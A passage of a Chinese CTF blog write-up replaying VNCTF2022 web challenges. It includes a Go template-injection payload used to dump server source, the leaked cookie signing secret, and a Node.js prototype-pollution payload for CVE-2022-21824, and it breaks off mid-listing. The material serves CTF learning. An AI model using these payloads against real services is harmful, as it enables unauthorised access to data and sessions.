@@ -1,0 +1,1443 @@
+<!DOCTYPE HTML>
+<html lang="zh_Cn">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="VNCTF-web复现, 123">
+    <meta name="description" content="VNCTF2022-web">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>VNCTF-web复现 | kingkb</title>
+    <link rel="icon" type="image/png" href="/medias/logo1.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="kingkb" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo1.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">kingkb</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo1.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">kingkb</div>
+        <div class="logo-desc">
+            
+            no game no life
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://kingofkb.github.io/medias/cover/fczx.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">VNCTF-web复现</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="container content">
+
+    
+    <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/VNCTF2022/">
+                                <span class="chip bg-color">VNCTF2022</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/ctf/" class="post-category">
+                                ctf
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-02-18
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-08-29
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    5.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    29 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="VNCTF-web复现"><a href="#VNCTF-web复现" class="headerlink" title="VNCTF-web复现"></a>VNCTF-web复现</h1><h2 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h2><p>在/js/data.js最后有一个base64加密的文本，解码得到flag:VNCTF{Welcome_to_VNCTF2022}</p>
+<h2 id="gocal0"><a href="#gocal0" class="headerlink" title="gocal0"></a>gocal0</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="go"><a href="#go" class="headerlink" title="go"></a>go</h4><p><a target="_blank" rel="noopener" href="https://www.runoob.com/go/go-tutorial.html">go菜鸟教程</a></p>
+<h4 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h4><p>不知道这个题目具体是哪种，等完了有时间把SSTI注入整理一下。（大坑）</p>
+<h3 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h3><p>打开题目环境，有flag，进入，提示flag在session中。<br>同时在输入框中，无论输入什么都正常回显，猜测SSTI注入，利用{ {printf “%+v” .} }直接获取源码。<br>手动对齐了一下。</p>
+<pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main 
+<span class="token keyword">import</span> <span class="token punctuation">(</span> 
+    <span class="token boolean">_</span> <span class="token string">"embed"</span> 
+    <span class="token string">"fmt"</span> 
+    <span class="token string">"os"</span> 
+    <span class="token string">"reflect"</span> 
+    <span class="token string">"strings"</span> 
+    <span class="token string">"text/template"</span> 
+    <span class="token string">"github.com/gin-contrib/sessions"</span> 
+    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span> 
+    <span class="token string">"github.com/gin-gonic/gin"</span> 
+    <span class="token string">"github.com/maja42/goval"</span> 
+    <span class="token punctuation">)</span> 
+<span class="token comment" spellcheck="true">//go:embed template/index.html var tpl string </span>
+<span class="token comment" spellcheck="true">//go:embed main.go var source string type Eval struct { E string `json:"e" form:"e" binding:"required"` } </span>
+<span class="token keyword">func</span> <span class="token punctuation">(</span>e Eval<span class="token punctuation">)</span> <span class="token function">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    eval <span class="token operator">:=</span> goval<span class="token punctuation">.</span><span class="token function">NewEvaluator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> result<span class="token punctuation">,</span> err <span class="token operator">:=</span> eval<span class="token punctuation">.</span><span class="token function">Evaluate</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>E<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span> 
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> 
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err 
+    <span class="token punctuation">}</span> 
+    t <span class="token operator">:=</span> reflect<span class="token punctuation">.</span><span class="token function">ValueOf</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Kind</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+    <span class="token keyword">if</span> t <span class="token operator">==</span> reflect<span class="token punctuation">.</span>Int <span class="token punctuation">{</span> 
+        <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> result<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span> 
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">else</span> <span class="token keyword">if</span> t <span class="token operator">==</span> reflect<span class="token punctuation">.</span>String <span class="token punctuation">{</span> 
+        <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span> 
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">else</span> <span class="token punctuation">{</span> 
+        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"not valid type"</span><span class="token punctuation">)</span> 
+    <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span> 
+<span class="token keyword">func</span> <span class="token punctuation">(</span>e Eval<span class="token punctuation">)</span> <span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span> <span class="token punctuation">{</span> 
+    res<span class="token punctuation">,</span> err <span class="token operator">:=</span> e<span class="token punctuation">.</span><span class="token function">Result</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> 
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> 
+        res <span class="token operator">=</span> <span class="token string">"invalid"</span> 
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">return</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"%s = %s"</span><span class="token punctuation">,</span> e<span class="token punctuation">.</span>E<span class="token punctuation">,</span> res<span class="token punctuation">)</span> 
+<span class="token punctuation">}</span> 
+<span class="token keyword">func</span> <span class="token function">render</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">var</span> his <span class="token builtin">string</span> 
+    <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> 
+        his <span class="token operator">=</span> <span class="token string">""</span> 
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">else</span> <span class="token punctuation">{</span> 
+        his <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span> 
+    <span class="token punctuation">}</span> 
+    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> <span class="token string">"{{result}}"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span><span class="token punctuation">)</span> t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span>strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>tpl<span class="token punctuation">,</span> <span class="token string">"{{result}}"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> 
+        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> 
+        c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"internal error"</span><span class="token punctuation">)</span> 
+        <span class="token keyword">return</span> 
+    <span class="token punctuation">}</span> 
+    <span class="token keyword">if</span> err <span class="token operator">:=</span> t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>Writer<span class="token punctuation">,</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span> <span class="token string">"s0uR3e"</span><span class="token punctuation">:</span> source<span class="token punctuation">,</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span> 
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    port <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">)</span> 
+    <span class="token keyword">if</span> port <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span> 
+        port <span class="token operator">=</span> <span class="token string">"8080"</span> 
+    <span class="token punctuation">}</span> 
+    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"woW_you-g0t_sourcE_co6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">render</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> 
+    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> 
+        session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
+        session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+        c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"flag is in your session"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> 
+    r<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+        session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">var</span> his <span class="token builtin">string</span> 
+        <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> his <span class="token operator">=</span> <span class="token string">""</span> <span class="token punctuation">}</span> 
+        <span class="token keyword">else</span> <span class="token punctuation">{</span> his <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> 
+        eval <span class="token operator">:=</span> Eval<span class="token punctuation">{</span><span class="token punctuation">}</span> 
+        <span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">ShouldBind</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>eval<span class="token punctuation">)</span><span class="token punctuation">;</span> 
+        err <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> his <span class="token operator">=</span> his <span class="token operator">+</span> eval<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span> <span class="token punctuation">}</span> 
+        session<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"history"</span><span class="token punctuation">,</span> his<span class="token punctuation">)</span> session<span class="token punctuation">.</span><span class="token function">Save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">render</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> 
+    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">":%s"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+<span class="token punctuation">}</span> 
+</code></pre>
+<p>WP中写本地启动一个一样的就可以，把官方WP放下面，我自己在本地试的时候go环境没调好，完了再补</p>
+<pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main
+<span class="token keyword">import</span> 
+<span class="token punctuation">(</span>
+    <span class="token boolean">_</span> <span class="token string">"embed"</span>
+    <span class="token string">"fmt"</span>
+    <span class="token string">"os"</span>
+    <span class="token string">"github.com/gin-contrib/sessions"</span>
+    <span class="token string">"github.com/gin-contrib/sessions/cookie"</span>
+    <span class="token string">"github.com/gin-gonic/gin"</span>
+<span class="token punctuation">)</span>
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
+<span class="token punctuation">{</span>
+    port <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Getenv</span><span class="token punctuation">(</span><span class="token string">"PORT"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> port <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">{</span>
+    port <span class="token operator">=</span> <span class="token string">"8080"</span>
+    <span class="token punctuation">}</span>
+    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"woW_you-g0t_sourcE_co6e"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+    <span class="token function">println</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">":%s"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>补充一种超级非预期，出题人疏忽忘记加密cookie，直接对session进行base64解码（注意用hackbar，我用的网站是解不出来的），解完之后找出像base64加密的地方再解码，得到flag:flag{36ad49a5-a9f3-4ea6-9a61-04a17a418586}</p>
+<h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="原链型污染"><a href="#原链型污染" class="headerlink" title="原链型污染"></a>原链型污染</h4><p><a target="_blank" rel="noopener" href="https://nodejs.org/zh-cn/blog/vulnerability/jan-2022-security-releases/">CVE-2022-21824</a><br><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21824">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21824</a></p>
+<h3 id="题目详解-1"><a href="#题目详解-1" class="headerlink" title="题目详解"></a>题目详解</h3><p>官方payload</p>
+<pre class=" language-1"><code class="language-1">console.table([{a:1}],['__proto__'])
+</code></pre>
+<p>输入后直接访问/flag，获得flag:flag{db24dccc-dd0f-4734-b6d0-ca7a7dc2dbf6}</p>
+<p>打开环境，进入source得到源码</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"express"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"path"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> vm2 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"vm2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
